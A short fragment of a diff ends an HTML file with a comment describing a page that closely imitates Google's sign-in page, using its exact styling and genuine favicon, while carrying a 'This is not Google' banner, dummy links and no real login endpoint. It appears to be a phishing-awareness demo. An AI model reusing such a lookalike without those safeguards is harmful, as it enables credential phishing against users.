+     typography, button shape, colors, and spacing. The warning banner at the top clearly
+     states "This is not Google" in US English with a warning symbol. Favicon is genuine Google
+     favicon from google.com, so the tab shows the official Google "G" logo. 
+     The page is fully responsive, exactly as Google's sign-in page layout.
+     No real authentication endpoints, all links are dummy, and warning appears on any interactive action. -->
 </body>
 </html>
